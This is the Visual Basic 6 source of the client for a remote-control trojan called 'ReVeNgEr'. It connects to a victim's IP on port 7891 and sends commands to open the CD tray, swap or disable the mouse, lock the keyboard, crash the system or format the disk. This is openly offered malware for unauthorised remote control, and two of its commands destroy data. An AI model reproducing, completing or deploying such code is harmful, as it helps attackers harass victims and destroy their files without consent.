VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "-=ReVeNgEr=- made by LaMeRi (Client)"
   ClientHeight    =   3180
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5955
   Icon            =   "mainc.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3180
   ScaleWidth      =   5955
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame1 
      Caption         =   "Client Status"
      Height          =   3135
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   5895
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   5400
         Top             =   0
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin VB.Frame Frame3 
         Caption         =   "Connection"
         Height          =   1575
         Left            =   120
         TabIndex        =   7
         Top             =   240
         Width           =   5655
         Begin VB.CommandButton Command9 
            Caption         =   "Disconnect"
            Enabled         =   0   'False
            Height          =   375
            Left            =   1320
            TabIndex        =   17
            Top             =   1080
            Width           =   1095
         End
         Begin VB.CommandButton Command8 
            Caption         =   "Send"
            Height          =   375
            Left            =   1320
            TabIndex        =   16
            Top             =   600
            Visible         =   0   'False
            Width           =   495
         End
         Begin VB.TextBox Text3 
            Height          =   285
            Left            =   1800
            TabIndex        =   15
            Top             =   720
            Visible         =   0   'False
            Width           =   255
         End
         Begin VB.CommandButton Command7 
            Caption         =   "Connect"
            Height          =   375
            Left            =   120
            TabIndex        =   14
            Top             =   1080
            Width           =   1095
         End
         Begin VB.TextBox Text2 
            Enabled         =   0   'False
            Height          =   285
            Left            =   560
            TabIndex        =   11
            Text            =   "7891"
            Top             =   560
            Width           =   615
         End
         Begin VB.TextBox Text1 
            Height          =   285
            Left            =   1080
            MaxLength       =   16
            TabIndex        =   9
            Top             =   210
            Width           =   1575
         End
         Begin VB.Label Label6 
            Caption         =   "If you know how to do this please e-mail me back at jimmy84@otenet.gr with the code and your e-mail. Thank you."
            Height          =   855
            Left            =   2880
            TabIndex        =   21
            Top             =   600
            Width           =   2655
         End
         Begin VB.Line Line1 
            X1              =   2760
            X2              =   2760
            Y1              =   120
            Y2              =   1560
         End
         Begin VB.Label Label5 
            AutoSize        =   -1  'True
            Caption         =   "Server responses :"
            Height          =   195
            Left            =   2880
            TabIndex        =   20
            Top             =   240
            Width           =   1320
         End
         Begin VB.Label Label4 
            AutoSize        =   -1  'True
            Height          =   195
            Left            =   720
            TabIndex        =   13
            Top             =   840
            Width           =   45
         End
         Begin VB.Label Label3 
            AutoSize        =   -1  'True
            Caption         =   "Status :"
            Height          =   195
            Left            =   120
            TabIndex        =   12
            Top             =   840
            Width           =   540
         End
         Begin VB.Label Label2 
            AutoSize        =   -1  'True
            Caption         =   "Port :"
            Height          =   195
            Left            =   120
            TabIndex        =   10
            Top             =   600
            Width           =   375
         End
         Begin VB.Label Label1 
            AutoSize        =   -1  'True
            Caption         =   "IP address :"
            Height          =   195
            Left            =   120
            TabIndex        =   8
            Top             =   240
            Width           =   840
         End
      End
      Begin VB.Frame Frame2 
         Caption         =   "Commands"
         Height          =   1215
         Left            =   120
         TabIndex        =   1
         Top             =   1800
         Width           =   5655
         Begin VB.CommandButton Command10 
            Caption         =   "Dis. Mouse"
            Height          =   375
            Left            =   4560
            TabIndex        =   19
            Top             =   480
            Width           =   975
         End
         Begin VB.CommandButton Command5 
            Caption         =   "Format"
            Height          =   375
            Left            =   3120
            TabIndex        =   18
            Top             =   240
            Width           =   1335
         End
         Begin VB.CommandButton Command6 
            Caption         =   "Lock keyboard"
            Height          =   375
            Left            =   1560
            TabIndex        =   6
            Top             =   720
            Width           =   1455
         End
         Begin VB.CommandButton Command4 
            Caption         =   "System Crash"
            Height          =   375
            Left            =   3120
            TabIndex        =   5
            Top             =   720
            Width           =   1335
         End
         Begin VB.CommandButton Command3 
            Caption         =   "Swap buttons"
            Height          =   375
            Left            =   1560
            TabIndex        =   4
            Top             =   240
            Width           =   1455
         End
         Begin VB.CommandButton Command2 
            Caption         =   "Close CD-ROM"
            Height          =   375
            Left            =   120
            TabIndex        =   3
            Top             =   720
            Width           =   1335
         End
         Begin VB.CommandButton Command1 
            Caption         =   "Open CD-ROM"
            Height          =   375
            Left            =   120
            TabIndex        =   2
            Top             =   240
            Width           =   1335
         End
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
On Error Resume Next
Text3.Text = "Open CD-ROM"
Command8_Click
End Sub

Private Sub Command10_Click()
On Error Resume Next
Text3.Text = "Lock mouse"
Command8_Click

End Sub

Private Sub Command11_Click()
On Error Resume Next
Text3.Text = "Connect"
Command8_Click
End Sub

Private Sub Command2_Click()
On Error Resume Next
Text3.Text = "Close CD-ROM"
Command8_Click
End Sub

Private Sub Command3_Click()
On Error Resume Next
Text3.Text = "Swap buttons"
Command8_Click
End Sub

Private Sub Command4_Click()
On Error Resume Next
Text3.Text = "Crash"
Command8_Click
End Sub

Private Sub Command5_Click()
On Error Resume Next
Text3.Text = "Format"
Command8_Click
End Sub

Private Sub Command6_Click()
On Error Resume Next
Text3.Text = "Lock keyboard"
Command8_Click
End Sub

Private Sub Command7_Click()
On Error Resume Next
On Error GoTo errorhandler
Winsock1.Close 'make sure it isnt open cuz of errors
Winsock1.RemoteHost = Text1.Text 'this sets the remotehost to you
Winsock1.RemotePort = Text2.Text 'port to login to, the port that winsock1 is watching
Winsock1.Connect 'connect
Command7.Enabled = False
Command9.Enabled = True
Label4.Caption = "Connected!"
errorhandler: If Err.Number = 10049 Then
Label4.Caption = "Could not connect to server."
Command7.Enabled = True
Command8.Enabled = False
End If
End Sub
Private Sub Command8_Click()
Winsock1.SendData Text3.Text 'this will send data
End Sub
Private Sub Command9_Click()
Command9.Enabled = False
Command7.Enabled = True
Label4.Caption = "Disconnected"
Winsock1.Close
End Sub
Private Sub Form_Load()

Label4.Caption = "Disconnected"
End Sub

